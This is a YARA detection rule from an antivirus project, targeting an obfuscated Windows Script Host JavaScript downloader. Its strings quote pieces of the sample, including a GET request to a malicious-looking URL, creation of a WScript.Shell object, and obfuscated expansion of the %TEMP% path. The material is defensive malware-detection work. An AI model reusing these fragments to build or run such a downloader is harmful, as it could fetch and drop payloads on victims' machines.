rule sig_20160427_4ee6d0317b00d7d734ddda23dea49e9d {
  meta:
    description = "datamaliciousorder - file 20160427_4ee6d0317b00d7d734ddda23dea49e9d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0ff736497d4db92e6b3ee0c83d5e60b57497c66d652df4ca563bbd856dec7449"

  strings:
    $s1  = "IxouwRgauv[NasdxNpxuq](\"G\" + \"ET\", \"http://aaacollectionsjewelry.com/ur8fgs\", false);" fullword ascii
    $s2  = "function AbefuEajjl() {return EstosKldur[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"WuJjQuf" ascii
    $s3  = "function AbefuEajjl() {return EstosKldur[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"WuJjQuf" ascii
    $s4  = "var EstosKldur = function BckbhJklqm() {return NclagSkrdd[NlgyePwjxv](\"WScript\"+\".Shell\");}(), UlugiUbvkh = 11;" fullword ascii
    $s5  = "function TbdhtHxryn(QrikiCezya, VdzlwZxoeb){UiccuPrvux = UiccuPrvux * 1; return QrikiCezya - VdzlwZxoeb;};" fullword ascii
    $s6  = "var NclagSkrdd = this[\"WScript\"];" fullword ascii
    $s7  = "if (IxouwRgauv[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function XzxtaKkgnb(){return KqnbbHbmoy + \"\";};" fullword ascii
    $s9  = "function SrslnPbskn() {return ((JgktyZirzp == true) && (JgktyZirzp == ObpbtUzvws)) ? 1 : UiccuPrvux;};" fullword ascii
    $s10 = "function JdzmfBggme(){return 23;};" fullword ascii
    $s11 = "function LqdrxKoiip()" fullword ascii
    $s12 = "return TbdhtHxryn(ShvhvLkmim, OtszgFlwkc);" fullword ascii
    $s13 = "ObpbtUzvws = true; " fullword ascii
    $s14 = "var ObpbtUzvws = false;" fullword ascii
    $s15 = "var YsjjtYrevn = new this[\"D\"+\"ate\"]();" fullword ascii
    $s16 = "ZoytdBfynq = true;" fullword ascii
    $s17 = "var ZoytdBfynq = false;" fullword ascii
    $s18 = "function KzvltAicyc(QfzkwDgtju) {var NrzscGypno = (1, 2, 3, 4, 5, QfzkwDgtju); return NrzscGypno;};" fullword ascii
    $s19 = "JgktyZirzp = true; " fullword ascii
    $s20 = "var JgktyZirzp = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}